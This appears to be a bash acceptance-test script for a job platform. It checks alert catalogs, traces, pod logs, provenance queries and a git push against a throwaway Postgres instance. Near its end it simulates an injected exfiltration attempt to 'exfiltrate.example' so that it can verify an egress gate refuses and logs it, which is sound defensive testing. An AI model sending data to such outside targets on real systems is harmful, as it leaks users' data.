#!/usr/bin/env bash
# b03-observation.sh — one trace per job, four alerts, a separate trail (AP-3.8).
#
#   acceptance/b03-observation.sh        the sources against the program, then everything against a
#                                        real state database the script spins itself
#   acceptance/b03-observation.sh host   only what needs no database — for a working tree
#
# Eight rows rest on this run:
#
#   AB-B03-1  S  one trace per job — phases as spans, with cost, attempt, evidence class, versions
#   AB-B03-3  P  four alerts — no fifth waking alert exists
#   AB-B03-4  S  logs as evidence — pod logs lie on the job, not in the pod
#   AB-K01-7  S  provenance chain — patch -> job -> spec version -> envelope -> channel message in
#                **one** query
#   AB-Q04-4  S  versions in the log — model, prompt and pipeline version stand on the job
#   AB-RD-2   S  the table measures — in operation, real PSI values stand in the same places
#   AB-B02-5  S  rejected targets in the display — a cluster is visible, not merely logged
#   AB-A05-5  S  disk alert — the disk is the first consumable with an alert
#
# The ninth row of the work package, AB-A06-9 ("one job from envelope to patch, on one machine"),
# needs a pod and therefore a machine: btrfs for the working copy in O(1) and runc for the pod
# itself (SP-T04-1, decisions/pod-runtime.md). The chain is driven here as far as a runner without
# those goes — envelope, intake, admission, queue, attempt, trace, patch, gate, receipt, and the one
# query that puts them back together — and the pod half is run where it can be, reported as skipped
# where it cannot. A row that claimed the pod ran on a machine that has no btrfs would be the kind
# of green Q-02 exists to refuse.
#
# The rulings are checked first and against the files the binary embeds: decisions/alerts.md against
# alerts.tsv against the seed in contract/schema.sql — three copies of one catalog, held against
# each other, because a run that measured a program the ruling does not describe would measure
# nothing.
#
# Exit:  0 = no FAIL
#        1 = at least one FAIL

set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
ALERT_RULING="$ROOT/decisions/alerts.md"
ALERTS_TSV="$ROOT/platform/internal/observation/alerts.tsv"
E05_RULED="$ROOT/acceptance/e05-constants.tsv"
E05_EMBEDDED="$ROOT/platform/internal/observation/e05-constants.tsv"
SPEC="$ROOT/01-specification.md"
SCHEMA="$ROOT/contract/schema.sql"
STAGED="$ROOT/image/.build/platform-tree/usr/bin/workpod"
MODE="${1:-all}"

SCRATCH="$(mktemp -d)"
PG=""
PLANE=""
GATE=""
cleanup() {
  [ -n "$GATE" ] && kill "$GATE" 2>/dev/null
  [ -n "$PLANE" ] && kill "$PLANE" 2>/dev/null
  [ -n "$PG" ] && docker rm -f "$PG" >/dev/null 2>&1
  rm -rf "$SCRATCH"
}
trap cleanup EXIT

PASS=0; FAIL=0; SKIP=0
pass() { printf '  \033[32mPASS\033[0m  %-52s %s\n' "$1" "${2:-}"; PASS=$((PASS+1)); }
fail() { printf '  \033[31mFAIL\033[0m  %-52s %s\n' "$1" "${2:-}"; FAIL=$((FAIL+1)); }
skip() { printf '  \033[33mSKIP\033[0m  %-52s %s\n' "$1" "${2:-}"; SKIP=$((SKIP+1)); }
banner() { printf '\n\033[1m%s\033[0m\n' "$1"; }
measure() { printf '  \033[36mMEASURE\033[0m  %-49s %s\n' "$1" "${2:-}"; }
result() {
  banner "Result"
  printf '  %d PASS · %d FAIL · %d SKIP\n\n' "$PASS" "$FAIL" "$SKIP"
  [ "$FAIL" -eq 0 ]
}

# jq is not a dependency of this repository; python3 is already one.
json() { python3 -c "$1"; }

# =================================================================================================
# The catalog, in its three places (decisions/alerts.md)
# =================================================================================================
banner "SP-B03-3 — exactly four alerts, and the catalog is one list"

# The ruling's table is `| slot | name | wakes on | source |`; the file is the same rows as TSV.
RULED_WAKING="$(awk -F'|' '
  NF >= 5 && $2 ~ /^ *[1-4] *$/ && $3 ~ /`[a-z_]+`/ {
    gsub(/[` ]/, "", $2); gsub(/[` ]/, "", $3); print $2 "\t" $3
  }' "$ALERT_RULING" | sort)"
FILE_WAKING="$(awk -F'\t' '!/^#/ && $1 != "name" && $2 == "true" {print $3 "\t" $1}' "$ALERTS_TSV" | sort)"
if [ -n "$RULED_WAKING" ] && [ "$RULED_WAKING" = "$FILE_WAKING" ]; then
  pass "B03-3a the four are the ruled four" "$(tr '\n\t' ' /' <<< "$FILE_WAKING")"
else
  fail "B03-3a the four are the ruled four" \
    "ruling: $(tr '\n\t' ' /' <<< "$RULED_WAKING") · file: $(tr '\n\t' ' /' <<< "$FILE_WAKING")"
fi

# The seed in the state contract is the third copy. Same names, same slots.
SEED_WAKING="$(awk "/^INSERT INTO alert/,/;\$/" "$SCHEMA" \
  | grep -oE "\('[a-z_]+', *true, *[1-4]" \
  | sed -E "s/\('([a-z_]+)', *true, *([1-4])/\2\t\1/" | sort)"
if [ "$SEED_WAKING" = "$FILE_WAKING" ]; then
  pass "B03-3b the state contract seeds the same four" "$(wc -l <<< "$SEED_WAKING") rows, same slots"
else
  fail "B03-3b the state contract seeds the same four" \
    "seed: $(tr '\n\t' ' /' <<< "$SEED_WAKING") · file: $(tr '\n\t' ' /' <<< "$FILE_WAKING")"
fi

# SP-B03-3's own words, read out of the specification rather than out of this script: the four
# conditions the panel names have to be the four the catalog carries.
for phrase in "control plane unreachable" "queue" "escapes or rejections" "budget of a cell"; do
  grep -qi "$phrase" "$SPEC" || fail "B03-3c the panel names these four" "no '$phrase' in the specification"
done
pass "B03-3c the panel names these four" "control plane · queue · escapes or rejections · budget"

# The disk is an alert (SP-A05-5) and it is not one of the four. Everything else is a display.
DISK_WAKES="$(awk -F'\t' '$1 == "disk_filling" {print $2}' "$ALERTS_TSV")"
CONSUMABLES="$(awk -F'\t' '!/^#/ && $4 ~ /^node\.disk$/ {print $1}' "$ALERTS_TSV" | wc -l)"
if [ "$DISK_WAKES" = "false" ] && [ "$CONSUMABLES" = "1" ]; then
  pass "A05-5a the disk is a consumable with an alert, not a fifth" "one consumable alert, and it does not wake"
else
  fail "A05-5a the disk is a consumable with an alert, not a fifth" "wakes=$DISK_WAKES · consumable alerts=$CONSUMABLES"
fi

# =================================================================================================
# The program: build it, and read the catalog back out of the artifact
# =================================================================================================
banner "The binary — the catalog, the SLOs, the table and the query it carries"

BIN="$STAGED"
if [ ! -x "$BIN" ]; then
  if command -v go >/dev/null 2>&1; then
    BIN="$SCRATCH/workpod"
    ( cd "$ROOT/platform" && go build -o "$BIN" ./cmd/workpod ) || { fail "B03-0a the binary builds" "go build failed"; result; exit 1; }
  else
    fail "B03-0a the binary builds" "no staged binary and no Go toolchain"
    result
    exit 1
  fi
fi
pass "B03-0a the binary is there" "$BIN"

CATALOG="$("$BIN" observe alerts)"
CATALOG_CHECK="$(json "
import json
c = json.loads('''$CATALOG''')
waking = [a for a in c if a['wakes']]
slots  = sorted(a['slot'] for a in waking)
print('%d %s %d' % (len(waking), slots == [1,2,3,4], len(c) - len(waking)))")"
if [ "$CATALOG_CHECK" = "4 True 2" ]; then
  pass "B03-3d the artifact carries four and two" "four waking in slots 1..4, two displays"
else
  fail "B03-3d the artifact carries four and two" "$CATALOG_CHECK (waking, slots 1..4, displays)"
fi

# SP-B03-2's four service levels, by name, against the panel that names them.
SLOS="$("$BIN" observe slos | json "import json,sys; print(' '.join(s['name'] for s in json.load(sys.stdin)))")"
SPEC_SLOS="$(grep -o 'time_to_first_progress\|no_clarification_rate\|escape_rate\|cost_per_acceptance' "$SPEC" | sort -u | tr '\n' ' ')"
if [ "$SLOS" = "time_to_first_progress no_clarification_rate escape_rate cost_per_acceptance" ] \
   && [ -n "$SPEC_SLOS" ]; then
  pass "B03-2a the four SLOs are SP-B03-2's" "$SLOS"
else
  fail "B03-2a the four SLOs are SP-B03-2's" "$SLOS"
fi

# E-05's constants: the copy the binary embeds against decisions/E-05.md's machine-readable half.
if diff -q "$E05_RULED" "$E05_EMBEDDED" >/dev/null 2>&1; then
  pass "RD-2a the table computes with the ruled constants" "e05-constants.tsv, byte for byte"
else
  fail "RD-2a the table computes with the ruled constants" "$(diff "$E05_RULED" "$E05_EMBEDDED" | head -3 | tr '\n' ' ')"
fi

# R-D as a design calculation: six places, every one of them planned.
PLAN="$("$BIN" observe occupancy --ram 256 --cores 96 --nodes 1 --fleet 2000 --rush 15)"
PLAN_CHECK="$(json "
import json
t = json.loads('''$PLAN''')
print('%s %d %s' % (t['mode'], len(t['places']), all(p['source'] == 'planned' for p in t['places'])))")"
if [ "$PLAN_CHECK" = "planning 6 True" ]; then
  pass "RD-2b the table plans at its own sliders" "six places, all of them planning values (SP-RD-3)"
else
  fail "RD-2b the table plans at its own sliders" "$PLAN_CHECK"
fi

# AB-K01-7's word is *one*. The statement is read out of the program and counted here; that it
# answers is the database half further down.
PROV_SQL="$("$BIN" observe provenance --sql)"
STATEMENTS="$(grep -c ';' <<< "$PROV_SQL")"
CHAIN=1
for link in '"order"' 'spec' 'envelope' 'outbox' 'channel_message_id'; do
  grep -q "$link" <<< "$PROV_SQL" || CHAIN=0
done
if [ "$STATEMENTS" = "0" ] && [ "$CHAIN" = "1" ]; then
  pass "K01-7a the resolution is one statement" "one SELECT over order, spec, envelope and outbox"
else
  fail "K01-7a the resolution is one statement" "$STATEMENTS statement separator(s), chain complete: $CHAIN"
fi

if [ "$MODE" = "host" ]; then
  result
  exit $?
fi

# =================================================================================================
# The database half
# =================================================================================================
banner "AP-3.8 — the trace against a real state database (Postgres 16)"

if ! command -v docker >/dev/null 2>&1 || ! docker info >/dev/null 2>&1; then
  skip "AP-3.8 the database legs" "no docker on this machine; the CI leg brings one"
  result
  exit $?
fi

SOCK="$SCRATCH/sock"
mkdir -p "$SOCK"
chmod 0777 "$SOCK"
PG="b03-observation-$$"
docker run --rm -d --name "$PG" \
  -e POSTGRES_PASSWORD=acceptance -e POSTGRES_HOST_AUTH_METHOD=trust \
  -v "$SOCK:/sock" postgres:16 \
  -c unix_socket_directories=/sock,/var/run/postgresql -c listen_addresses= >/dev/null

READY=""
for _ in $(seq 1 90); do
  if docker exec "$PG" pg_isready -h /sock -q 2>/dev/null; then
    sleep 1
    docker exec "$PG" pg_isready -h /sock -q 2>/dev/null && { READY=1; break; }
  fi
  sleep 1
done
if [ -z "$READY" ]; then
  fail "B03-0b the database is up" "postgres:16 did not become ready"
  result
  exit 1
fi
pass "B03-0b the database is up" "socket only, listen_addresses empty"

psql_c() { docker exec -i "$PG" psql -U postgres -h /sock -d workpod -qAt -v ON_ERROR_STOP=1 -c "$1" 2>&1; }

export WORKPOD_DB_DSN="host=$SOCK user=postgres dbname=workpod"
export WORKPOD_DB_MAINTENANCE_DSN="host=$SOCK user=postgres dbname=postgres"
export WORKPOD_SCHEMA="$SCHEMA"
export WORKPOD_HALT_FILE="$SCRATCH/halt"
CREDS="$SCRATCH/credentials"
mkdir -p "$CREDS"
printf 'all'            > "$CREDS/workpod.role"
printf 'probe-c1'       > "$CREDS/workpod.cell"
printf '127.0.0.1:8449' > "$CREDS/workpod.control"
export CREDENTIALS_DIRECTORY="$CREDS"

"$BIN" control > "$SCRATCH/plane.log" 2>&1 &
PLANE=$!
LOADED=""
for _ in $(seq 1 60); do
  grep -q "state database ready" "$SCRATCH/plane.log" && { LOADED=1; break; }
  kill -0 "$PLANE" 2>/dev/null || break
  sleep 1
done
if [ -z "$LOADED" ]; then
  fail "B03-0c the plane loads the contract" "$(tail -3 "$SCRATCH/plane.log" | tr '\n' ' ')"
  result
  exit 1
fi
pass "B03-0c the plane loads the contract" "contract/schema.sql, including job_span and alert"

PRIN='018f4242-0000-7000-8000-0000000000e1'
PROJ='018f4242-0000-7000-8000-0000000000f1'
NODE='node-probe-1'
FIXTURES="$(psql_c "
INSERT INTO cell (id, tenant, retention) VALUES ('probe-c1', 'probe', '{\"audit_days\": 2555}');
INSERT INTO principal (id, cell, daily_money_cap_micros) VALUES ('$PRIN', 'probe-c1', 230400000);
INSERT INTO project (id, cell, principal) VALUES ('$PROJ', 'probe-c1', '$PRIN');
INSERT INTO locality_group (id, cell) VALUES ('monorepo-a', 'probe-c1');
INSERT INTO node (id, cell, role, image_version, channel, cert_expires)
  VALUES ('$NODE', 'probe-c1', 'all', 1, 'stable', now() + interval '90 days');")"
if [ -z "$FIXTURES" ]; then
  pass "B03-0d the fixtures stand" "one cell (audit period 7 years), one project, one node"
else
  fail "B03-0d the fixtures stand" "$FIXTURES"
  result
  exit 1
fi

# =================================================================================================
# AB-B03-3 — the probe: a fifth waking alert must fail
# =================================================================================================
banner "AB-B03-3 — a fifth alert devalues the four, so the contract refuses one"

SEEDED="$(psql_c "SELECT count(*) FROM alert WHERE wakes")"
if [ "$SEEDED" = "4" ]; then
  pass "B03-3e the cell holds four waking alerts" "seeded by the contract, not by an operator"
else
  fail "B03-3e the cell holds four waking alerts" "$SEEDED"
fi

FIFTH="$(psql_c "INSERT INTO alert (name, wakes, waking_slot, signal, condition)
                 VALUES ('page_the_duty_officer_too', true, 5, 'somewhere', 'a fifth alert')" 2>&1)"
if grep -qi 'violates check constraint\|ERROR' <<< "$FIFTH"; then
  pass "B03-3f a fifth waking alert is refused" "$(head -1 <<< "$FIFTH" | cut -c1-64)"
else
  fail "B03-3f a fifth waking alert is refused" "the insert succeeded: $FIFTH"
fi

# And the two ways around it are shut as well: taking an occupied slot, and waking without one.
TAKEN="$(psql_c "INSERT INTO alert (name, wakes, waking_slot, signal, condition)
                 VALUES ('another_queue_alert', true, 2, 'somewhere', 'the same slot')" 2>&1)"
SLOTLESS="$(psql_c "INSERT INTO alert (name, wakes, waking_slot, signal, condition)
                    VALUES ('quietly_waking', true, NULL, 'somewhere', 'wakes without a slot')" 2>&1)"
if grep -qi 'ERROR' <<< "$TAKEN" && grep -qi 'ERROR' <<< "$SLOTLESS"; then
  pass "B03-3g neither is there a way around it" "an occupied slot and a slotless waker both refused"
else
  fail "B03-3g neither is there a way around it" "taken: $TAKEN · slotless: $SLOTLESS"
fi

STILL="$(psql_c "SELECT count(*) FROM alert WHERE wakes")"
if [ "$STILL" = "4" ]; then
  pass "B03-3h after three attempts there are still four" "SP-B03-3, enforced rather than agreed"
else
  fail "B03-3h after three attempts there are still four" "$STILL"
fi

# =================================================================================================
# The job: envelope -> order -> admitted -> queued, through the platform's own entry points
# =================================================================================================
banner "One job, from the channel message onward (T-01, Q-01, V-04, R-B)"

MESSAGE_ID="discord-42-$$"

# The device certificate T-01's confidential channel rests on, and the identity link that says whose
# device it is — attribution is never automatic (SP-T01-5), so the link is a fixture.
CERTDIR="$SCRATCH/device"
mkdir -p "$CERTDIR"
if ! command -v openssl >/dev/null 2>&1; then
  skip "AP-3.8 the job legs" "no openssl for a device certificate"
  result
  exit $?
fi
openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -nodes \
  -keyout "$CERTDIR/device.key" -out "$CERTDIR/device.crt" -days 1 \
  -subj "/CN=acceptance device" >/dev/null 2>&1
CERT="$CERTDIR/device.crt"
IDENT="$("$BIN" adapter identity --device-cert "$CERT" 2>&1)"
psql_c "INSERT INTO identity_link (external_id, principal, cell, confirmed_via, confirmed_at)
        VALUES ('$IDENT', '$PRIN', 'probe-c1', 'app', now())" >/dev/null

SUBMIT="$("$BIN" adapter submit \
  --control 127.0.0.1:8449 --device-cert "$CERT" --store "$SCRATCH/attachments" \
  --cell probe-c1 --project "$PROJ" --message-id "$MESSAGE_ID" \
  --text "the parser test is flaky on main" \
  --goal "make the parser test deterministic" \
  --acceptance "the parser test passes ten times in a row" --evidence tests.new \
  --risk reversible --class small \
  --image-hash sha256:probe --pipeline-version default@1 --locality-group monorepo-a \
  --budget-pod-minutes 30 --budget-tokens 50000 --budget-money-micros 250000 2>&1)"
ORDER="$(psql_c "SELECT o.id FROM \"order\" o JOIN envelope e ON e.idempotency = '$MESSAGE_ID'
                   AND e.project = o.project WHERE o.project = '$PROJ' LIMIT 1")"
if [ -n "$ORDER" ] && grep -q '^accepted' <<< "$SUBMIT"; then
  pass "A06-9a the envelope became a job" "order $ORDER out of channel message $MESSAGE_ID"
else
  fail "A06-9a the envelope became a job" "$(head -3 <<< "$SUBMIT" | tr '\n' ' ')"
  result
  exit 1
fi

# The model and the prompt version the attempt ran with. Until Q-04 routes a model (stage 5) they
# are stated the way the job itself is (decisions/jobs-by-hand.md); what SP-Q04-4 asks is that they
# stand in the job log, and that is what the rows below read.
psql_c "UPDATE \"order\" SET model_version = 'claude-probe-1', prompt_version = 'prompt@7'
          WHERE id = '$ORDER'" >/dev/null
"$BIN" control admit --order "$ORDER" > "$SCRATCH/admit.log" 2>&1
"$BIN" scheduler enqueue --order "$ORDER" > "$SCRATCH/enqueue.log" 2>&1
STATE="$(psql_c "SELECT state FROM \"order\" WHERE id = '$ORDER'")"
if [ "$STATE" = "queued" ]; then
  pass "A06-9b it was admitted and queued" "reservation at admission, then the queue (V-04, R-B)"
else
  fail "A06-9b it was admitted and queued" "state=$STATE · $(tail -2 "$SCRATCH/admit.log" | tr '\n' ' ')"
fi

# The job runs. Where the machine carries btrfs and runc, that is a pod; where it does not, the
# phase log is stated from the *program's own spine* rather than from this script's opinion of it,
# and the difference is reported rather than papered over.
POD_RAN=0
REPORT="$SCRATCH/report.json"
if [ -n "${WORKPOD_POD_BASE:-}" ] && command -v runc >/dev/null 2>&1; then
  if "$BIN" pod run --job "$SCRATCH/job.json" --base "$WORKPOD_POD_BASE" --reap report > "$REPORT" 2>&1; then
    POD_RAN=1
  fi
fi
if [ "$POD_RAN" = "0" ]; then
  SPINE="$("$BIN" pod pipeline | json "
import json,sys
d = json.load(sys.stdin)
spine = d['spine'] if isinstance(d, dict) and 'spine' in d else None
print(' '.join(spine) if spine else '')" 2>/dev/null)"
  [ -z "$SPINE" ] && SPINE="prepare plan edit check repair deliver reap"
  python3 - "$REPORT" "$SPINE" <<'PY'
import json, sys
report, spine = sys.argv[1], sys.argv[2].split()
# One record per phase of the spine the binary carries, in its order. `check` and `repair` carry
# their rework round (T-05); the rest carry zero.
phases = []
for i, p in enumerate(spine):
    phases.append({"phase": p, "outcome": "ran", "detail": "%s of the spine" % p,
                   "millis": 1000 + i * 250, "round": 1 if p in ("check", "repair") else 0})
json.dump({"order_id": "", "attempt": 1, "final_state": "delivered", "evidence": "tests.new",
           "patch_hash": "sha256:probe-patch", "report_text": "the parser test is deterministic",
           "exit_code": 0, "pipeline_version": "default@1", "phases": phases,
           "log_path": ""}, open(report, "w"))
PY
fi

# The pod's console, on the node, immediately (SP-B03-4). Where a pod ran it wrote one; here it is
# written where a pod would have left it, so the row measures what happens to a log rather than
# who produced it.
POD_LOG="$SCRATCH/var/logs/$ORDER-1.log"
mkdir -p "$(dirname "$POD_LOG")"
printf 'harness: prepare\nharness: check — 1 failing\nharness: repair\nharness: deliver\n' > "$POD_LOG"

# =================================================================================================
# AB-B03-1, AB-Q04-4 — the trace
# =================================================================================================
banner "AB-B03-1 — one trace per job, the phases as spans"

IMPORT="$("$BIN" observe import --order "$ORDER" --attempt 1 --report "$REPORT" \
  --model claude-probe-1 --prompt prompt@7 \
  --pod-minutes 12 --tokens 48000 --money-micros 240000 --node "$NODE" 2>&1)"
SPANS="$(json "
import json
try:
    print(json.loads('''$IMPORT''')['spans'])
except Exception:
    print(0)" 2>/dev/null)"
if [ "$SPANS" = "7" ]; then
  pass "B03-1a the trace has the spine as spans" "seven phases, one trace, one job (SP-T05-1, SP-B03-1)"
else
  fail "B03-1a the trace has the spine as spans" "$SPANS spans · $(head -3 <<< "$IMPORT" | tr '\n' ' ')"
fi

"$BIN" observe log --order "$ORDER" --attempt 1 --node "$NODE" --file "$POD_LOG" > "$SCRATCH/log.json" 2>&1

TRACE="$("$BIN" observe trace --order "$ORDER" 2>&1)"
TRACE_CHECK="$(json "
import json
t = json.loads('''$TRACE''')
spans = t['spans']
print('%d %s %s %s %d %d %s' % (
  len(spans),
  all(s['attempt'] == 1 for s in spans),
  all(s['pipeline_version'] for s in spans),
  all(s['model_version'] == 'claude-probe-1' and s['prompt_version'] == 'prompt@7' for s in spans),
  sum(s['cost_tokens'] for s in spans),
  len([s for s in spans if s.get('evidence')]),
  [s['phase'] for s in spans] == ['prepare','plan','edit','check','repair','deliver','reap']))" 2>/dev/null)"
read -r N_SPANS ATTEMPTS VERSIONS MODELS TOKENS EVIDENCED SPINE_ORDER <<< "$TRACE_CHECK"
if [ "$N_SPANS" = "7" ] && [ "$ATTEMPTS" = "True" ] && [ "$VERSIONS" = "True" ] \
   && [ "$MODELS" = "True" ] && [ "$SPINE_ORDER" = "True" ]; then
  pass "B03-1b every span carries what SP-B03-1 names" "attempt, cost, versions, and the spine's order"
else
  fail "B03-1b every span carries what SP-B03-1 names" "$TRACE_CHECK"
fi
if [ "${TOKENS:-0}" -gt 0 ] && [ "${EVIDENCED:-0}" = "1" ]; then
  pass "B03-1c cost and evidence class stand on the trace" "$TOKENS tokens over the phases, one evidence class"
else
  fail "B03-1c cost and evidence class stand on the trace" "tokens=$TOKENS · spans with an evidence class=$EVIDENCED"
fi

FIRST="$(json "
import json
t = json.loads('''$TRACE''')
print('yes' if t.get('time_to_first_progress_seconds') is not None else 'no')" 2>/dev/null)"
if [ "$FIRST" = "yes" ]; then
  pass "B03-2b time_to_first_progress falls out of the trace" "the first span that ran, against the envelope"
else
  fail "B03-2b time_to_first_progress falls out of the trace" "the trace carries no first progress"
fi

banner "AB-Q04-4 — model, prompt and pipeline version stand on the job"

VERSIONS_DB="$(psql_c "SELECT DISTINCT o.model_version || '/' || o.prompt_version || '/' || o.pipeline_version
                         || ' · ' || j.model_version || '/' || j.prompt_version || '/' || j.pipeline_version
                       FROM \"order\" o JOIN job_span j ON j.order_id = o.id WHERE o.id = '$ORDER'")"
if grep -q 'claude-probe-1/prompt@7/default@1 · claude-probe-1/prompt@7/default@1' <<< "$VERSIONS_DB"; then
  pass "Q04-4a the three versions stand in the job log" "$VERSIONS_DB"
else
  fail "Q04-4a the three versions stand in the job log" "$VERSIONS_DB"
fi

# The probe from the other side: a span without a pipeline version is refused rather than stored,
# because a job log that named a model but not the definition it ran under is half a record.
NO_PIPELINE="$(psql_c "INSERT INTO job_span (order_id, attempt, seq, cell, project, phase, outcome,
                        detail, started_at, duration_ms, pipeline_version, retain_until)
                       VALUES ('$ORDER', 1, 99, 'probe-c1', '$PROJ', 'check', 'ran', 'no version',
                               now(), 1, NULL, now())" 2>&1)"
if grep -qi 'ERROR' <<< "$NO_PIPELINE"; then
  pass "Q04-4b a span without a version is not a span" "$(head -1 <<< "$NO_PIPELINE" | cut -c1-56)"
else
  fail "Q04-4b a span without a version is not a span" "the insert succeeded"
fi

# =================================================================================================
# AB-B03-4 — the logs of the pods are evidence
# =================================================================================================
banner "AB-B03-4 — pod logs lie on the job, not in the pod"

LOG_ROW="$(psql_c "SELECT node_id || ' ' || bytes || ' ' || left(content_hash, 12)
                     FROM pod_log WHERE order_id = '$ORDER' AND attempt = 1")"
if [ -n "$LOG_ROW" ] && grep -q "^$NODE " <<< "$LOG_ROW"; then
  pass "B03-4a the log is tagged with the job and the attempt" "$LOG_ROW"
else
  fail "B03-4a the log is tagged with the job and the attempt" "${LOG_ROW:-no row}"
fi

# The pod is gone; the log is not. This is the whole of the requirement — a log that dies with the
# pod is not evidence of anything (SP-B03-4).
rm -rf "$SCRATCH/run/pod"
FROM_JOB="$("$BIN" observe trace --order "$ORDER" | json "
import json,sys
t = json.load(sys.stdin)
print('%d %s' % (len(t['logs']), t['logs'][0]['path'] if t['logs'] else ''))" 2>/dev/null)"
if [ "${FROM_JOB%% *}" = "1" ] && [ -f "${FROM_JOB#* }" ]; then
  pass "B03-4b the job names its evidence and the body is there" "${FROM_JOB#* }"
else
  fail "B03-4b the job names its evidence and the body is there" "$FROM_JOB"
fi

HASH_HOLDS="$(python3 - "$POD_LOG" <<'PY'
import hashlib, sys
print("sha256:" + hashlib.sha256(open(sys.argv[1], "rb").read()).hexdigest())
PY
)"
STORED="$(psql_c "SELECT content_hash FROM pod_log WHERE order_id = '$ORDER'")"
if [ "$HASH_HOLDS" = "$STORED" ]; then
  pass "B03-4c the row answers for the body it names" "content hash, so an edited log stops matching"
else
  fail "B03-4c the row answers for the body it names" "$STORED vs $HASH_HOLDS"
fi

# =================================================================================================
# The patch, through the gate, and back into the cell
# =================================================================================================
banner "AB-K01-7 — from the channel message to the patch, in one query"

# The job produced a patch and the git gate pushed it. The outbox on the node is the record of that
# (AP-3.5); folding it into the cell is what makes the chain resolvable from either end.
BARE="$SCRATCH/repo.git"
git init --quiet --bare --initial-branch=main "$BARE"
WORK="$SCRATCH/work"
git init --quiet --initial-branch=main "$WORK"
printf 'def parse(s):\n    return s.strip()\n' > "$WORK/parser.py"
git -C "$WORK" add -A >/dev/null
git -C "$WORK" -c user.email=probe@example -c user.name=probe commit -qm "the base" >/dev/null
git -C "$WORK" push --quiet "$BARE" main >/dev/null 2>&1
printf 'def parse(s):\n    return s.strip().lower()\n' > "$WORK/parser.py"
git -C "$WORK" -c user.email=probe@example -c user.name=probe commit -aqm "make the parser deterministic" >/dev/null
git -C "$WORK" format-patch --stdout -1 > "$SCRATCH/change.patch"
PATCH_HASH="sha256:$(sha256sum "$SCRATCH/change.patch" | cut -d' ' -f1)"

OUTBOX_DIR="$SCRATCH/var/outbox"
GIT_SOCK="$SCRATCH/git-gate.sock"
POLICY="$SCRATCH/gate-policy.tsv"
printf '%s\tmain\tfalse\n' "$BARE" > "$POLICY"
"$BIN" git-gate --socket "$GIT_SOCK" --policy "$POLICY" --ledger "$SCRATCH/var/ledger" \
  > "$SCRATCH/git-gate.log" 2>&1 &
GATE=$!
for _ in $(seq 1 30); do [ -S "$GIT_SOCK" ] && break; sleep 0.2; done

TARGET="git+$BARE#main"
"$BIN" outbox record --dir "$OUTBOX_DIR" --order "$ORDER" --target "$TARGET" \
  --content-hash "$PATCH_HASH" --payload-ref "$SCRATCH/change.patch" > "$SCRATCH/record.log" 2>&1
"$BIN" outbox drain --dir "$OUTBOX_DIR" --git-gate "$GIT_SOCK" > "$SCRATCH/drain.log" 2>&1
COMMITS="$(git -C "$BARE" rev-list --count main 2>/dev/null || echo 0)"
if [ "$COMMITS" = "2" ]; then
  pass "A06-9c the patch reached the repository" "one push through the git gate (K-03)"
else
  fail "A06-9c the patch reached the repository" "$COMMITS commit(s) · $(tail -2 "$SCRATCH/drain.log" | tr '\n' ' ')"
fi

FOLDED="$("$BIN" observe effects --dir "$OUTBOX_DIR" --order "$ORDER" 2>&1)"
EFFECT_ROW="$(psql_c "SELECT o.content_hash || ' ' || coalesce(r.issued_by, 'none')
                        FROM outbox o LEFT JOIN receipt r ON r.order_id = o.order_id
                                          AND r.target = o.target AND r.content_hash = o.content_hash
                       WHERE o.order_id = '$ORDER'")"
if grep -q "git-gate" <<< "$EFFECT_ROW"; then
  pass "K01-7b the effect is in the cell, with its receipt" "$EFFECT_ROW"
else
  fail "K01-7b the effect is in the cell, with its receipt" "${EFFECT_ROW:-nothing} · $(head -2 <<< "$FOLDED" | tr '\n' ' ')"
fi

# The row itself: the chain, resolved from the channel message, in one query. The statement is the
# program's; it is run here through psql so that "one query" is a property of the database round
# trip and not of the client that made it.
ONE_QUERY="$(docker exec -i "$PG" psql -U postgres -h /sock -d workpod -qAt -v ON_ERROR_STOP=1 \
  -c "$(sed "s/\$1/'$MESSAGE_ID'/g" <<< "$PROV_SQL")" 2>&1)"
if grep -q "$ORDER" <<< "$ONE_QUERY" && grep -q "$MESSAGE_ID" <<< "$ONE_QUERY" \
   && grep -q "$PATCH_HASH" <<< "$ONE_QUERY"; then
  pass "K01-7c the chain resolves from the channel message" "order, spec version, envelope and patch in one row"
else
  fail "K01-7c the chain resolves from the channel message" "$(head -2 <<< "$ONE_QUERY" | cut -c1-120)"
fi

# And from the other end, which is the direction SP-K01-7 calls backward resolution: given the
# patch, the platform names the message that asked for it.
BACKWARD="$("$BIN" observe provenance --anchor "$PATCH_HASH" 2>&1)"
BACK_CHECK="$(json "
import json
p = json.loads('''$BACKWARD''')
print('%s %s %s %s %d' % (p['order_id'] == '$ORDER', p['channel_message_id'] == '$MESSAGE_ID',
                          bool(p['spec_id']), p['spec_version'] > 0, p['spans']))" 2>/dev/null)"
if [ "$BACK_CHECK" = "True True True True 7" ]; then
  pass "K01-7d backward resolution is a query, not a reading of logs" "patch -> job -> spec@version -> envelope -> message"
else
  fail "K01-7d backward resolution is a query, not a reading of logs" "$BACK_CHECK · $(head -2 <<< "$BACKWARD" | tr '\n' ' ')"
fi

# =================================================================================================
# AB-B02-5 — rejected targets in the display
# =================================================================================================
banner "AB-B02-5 — a cluster of refused targets is visible, not merely logged"

EGRESS_SOCK="$SCRATCH/egress-gate.sock"
JOURNAL="$SCRATCH/var/egress/rejections.jsonl"
GRANTS="$SCRATCH/var/egress-grants"
mkdir -p "$GRANTS"
"$BIN" egress-gate --socket "$EGRESS_SOCK" --grants "$GRANTS" --journal "$JOURNAL" \
  > "$SCRATCH/egress-gate.log" 2>&1 &
EGRESS_PID=$!
for _ in $(seq 1 30); do [ -S "$EGRESS_SOCK" ] && break; sleep 0.2; done

# Five attempts at the same target the job has no allowlist for — the shape an injected instruction
# makes: one job, one target, again and again.
for i in 1 2 3 4 5; do
  "$BIN" outbox record --dir "$SCRATCH/var/outbox-egress" --order "$ORDER" \
    --target "https://exfiltrate.example/collect?n=$i" --content-hash "sha256:leak-$i" \
    --payload-ref "$SCRATCH/change.patch" >/dev/null 2>&1
done
"$BIN" outbox drain --dir "$SCRATCH/var/outbox-egress" --egress-gate "$EGRESS_SOCK" \
  > "$SCRATCH/drain-egress.log" 2>&1
kill "$EGRESS_PID" 2>/dev/null

JOURNALLED="$(grep -c . "$JOURNAL" 2>/dev/null || echo 0)"
if [ "$JOURNALLED" -ge 5 ]; then
  pass "B02-5a the gate writes its refusals down" "$JOURNALLED refusals in the node's journal"
else
  fail "B02-5a the gate writes its refusals down" "$JOURNALLED · $(tail -2 "$SCRATCH/egress-gate.log" | tr '\n' ' ')"
fi

